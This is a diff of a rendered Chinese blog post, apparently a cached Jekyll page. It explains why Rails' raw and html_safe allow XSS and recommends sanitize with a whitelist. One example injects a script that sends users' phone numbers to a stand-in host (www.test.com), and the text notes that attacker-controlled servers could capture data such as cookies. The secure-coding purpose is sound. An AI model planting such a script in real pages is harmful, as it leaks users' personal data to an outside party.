@@ -1,0 +1,62 @@
+I"�<p>避免使用<code class="highlighter-rouge">raw</code>和<code class="highlighter-rouge">html_safe</code>, 安全使用<code class="highlighter-rouge">sanitize</code></p>
+<ul>
+  <li>
+    <h3 id="raw">raw</h3>
+    <p>例如：</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="o">&lt;</span><span class="sx">%= raw "&lt;script type=</span><span class="p">\</span><span class="s2">"text/javascript</span><span class="se">\"</span><span class="s2">&gt;window.location.href='http://www.test.com?a=</span><span class="si">#{</span><span class="no">User</span><span class="p">.</span><span class="nf">limit</span><span class="p">(</span><span class="mi">10</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:phone</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span><span class="si">}</span><span class="s2">';&lt;/script&gt;"</span> <span class="o">%&gt;</span></code></pre></figure>
+
+<p>结果：
+执行 <code class="highlighter-rouge">script</code>中的内容，并且查询<code class="highlighter-rouge">User</code>数据发送给<code class="highlighter-rouge">www.test.com</code>,如果<code class="highlighter-rouge">www.test.com</code>是自己的服务器，我们可以在服务器中截取<code class="highlighter-rouge">User</code>用户数据，比如<code class="highlighter-rouge">cookie</code></p>
+
+<p>我们可以看<code class="highlighter-rouge">raw</code>的源代码，其实就是用<code class="highlighter-rouge">html_safe</code>实现的</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">raw</span><span class="p">(</span><span class="n">stringish</span><span class="p">)</span>
+  <span class="n">stringish</span><span class="p">.</span><span class="nf">to_s</span><span class="p">.</span><span class="nf">html_safe</span>
+<span class="k">end</span></code></pre></figure>
+
+<ul>
+  <li>
+    <h3 id="html_safe">html_safe</h3>
+  </li>
+</ul>
+
+<p><code class="highlighter-rouge">html_safe</code>是完全把你的<code class="highlighter-rouge">html</code>内容原本原样的输出，这种事非常不安全的，把<code class="highlighter-rouge">script</code>标签的内容输出并执行结果，比如会造成XSS攻击
+和<code class="highlighter-rouge">raw</code>一样，同上</p>
+
+<ul>
+  <li>
+    <h3 id="sanitize">sanitize</h3>
+  </li>
+</ul>
+
+<p><code class="highlighter-rouge">sanitize</code>的源代码中：</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">self</span><span class="p">.</span><span class="nf">allowed_tags</span> <span class="o">=</span> <span class="no">Set</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sx">%w(strong em b i p code pre tt samp kbd var sub
+  sup dfn cite big small address hr br div span h1 h2 h3 h4 h5 h6 ul ol li dl dt dd abbr
+  acronym a img blockquote del ins)</span><span class="p">)</span>
+<span class="nb">self</span><span class="p">.</span><span class="nf">allowed_attributes</span> <span class="o">=</span> <span class="no">Set</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sx">%w(href src width height alt cite datetime title class name xml:lang abbr)</span><span class="p">)</span></code></pre></figure>
+
+<p>我们可以看到，<code class="highlighter-rouge">sanitize</code>是有默认的白名单，把一些危险的标签给去除掉，相对<code class="highlighter-rouge">html_safe</code>安全很多
+也可以自己设置白名单
+在<code class="highlighter-rouge">config/appliction.rb</code>中设置：</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">class</span> <span class="nc">Application</span> <span class="o">&lt;</span> <span class="no">Rails</span><span class="o">::</span><span class="no">Application</span>
+ <span class="n">config</span><span class="p">.</span><span class="nf">action_view</span><span class="p">.</span><span class="nf">sanitized_allowed_tags</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'table'</span><span class="p">,</span> <span class="s1">'tr'</span><span class="p">,</span> <span class="s1">'td'</span><span class="p">]</span> <span class="c1">#安全的标签</span>
+ <span class="n">config</span><span class="p">.</span><span class="nf">action_view</span><span class="p">.</span><span class="nf">sanitized_allowed_attributes</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'id'</span><span class="p">,</span> <span class="s1">'class'</span><span class="p">,</span> <span class="s1">'style'</span><span class="p">]</span> <span class="c1">#安全的属性</span>
+<span class="k">end</span></code></pre></figure>
+
+<p>例如：</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="o">&lt;</span><span class="sx">%= sanitize "&lt;script type=</span><span class="p">\</span><span class="s2">"text/javascript</span><span class="se">\"</span><span class="s2">&gt;window.location.href='http://www.test.com?a=</span><span class="si">#{</span><span class="no">User</span><span class="p">.</span><span class="nf">limit</span><span class="p">(</span><span class="mi">10</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:phone</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span><span class="si">}</span><span class="s2">';&lt;/script&gt;"</span> <span class="o">%&gt;</span></code></pre></figure>
+
+<p>结果：</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">window</span><span class="p">.</span><span class="nf">location</span><span class="p">.</span><span class="nf">href</span><span class="o">=</span><span class="s1">'http://www.test.com?a=***'</span><span class="p">;</span></code></pre></figure>
+
+<p>并不会执行<code class="highlighter-rouge">script</code>,而是把不是白名单的标签内容输出</p>
+
+<p>不管怎么样，使用<code class="highlighter-rouge">sanitize</code>就好了，如果有需求也可以自行配置<code class="highlighter-rouge">sanitize</code>的白名单，比较安全可靠</p>
+:ET
